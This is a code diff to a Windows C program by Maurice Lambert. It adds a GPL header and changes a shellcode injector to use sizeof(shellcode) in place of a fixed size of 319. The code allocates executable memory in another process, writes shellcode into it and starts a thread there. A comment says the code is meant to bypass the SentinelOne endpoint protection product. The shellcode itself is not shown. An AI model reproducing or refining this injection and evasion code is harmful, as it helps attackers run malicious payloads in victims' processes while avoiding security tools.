@@ -1,3 +1,17 @@
+/*
+    Copyright (C) 2023  Maurice Lambert
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -44,13 +58,13 @@ int main(int argc, char **argv) {
 		return 1;
 	}
 
-	LPVOID shellcode_pointer = VirtualAllocEx(process_handle, NULL, 319, 0x3000, 0x00000040);
+	LPVOID shellcode_pointer = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), 0x3000, 0x00000040);
 	if (process_handle == NULL) {
 		fputs("NULL shellcode pointer", stderr);
 		return 2;
 	}
 
-	unsigned int ok = WriteProcessMemory(process_handle, shellcode_pointer, shellcode, 319, NULL);
+	unsigned int ok = WriteProcessMemory(process_handle, shellcode_pointer, shellcode, sizeof(shellcode), NULL);
 	if (ok == 0) {
 		fputs("Write process memory fail.", stderr);
 		return 3;
@@ -62,7 +76,7 @@ int main(int argc, char **argv) {
 		return 4;
 	}
 	WaitForSingleObject(thread_handle, 1000);
-	CloseHandle(thread_handle);  // bypass SentinelOne
+	CloseHandle(thread_handle);
 
 	CloseHandle(process_handle); // bypass SentinelOne
 }
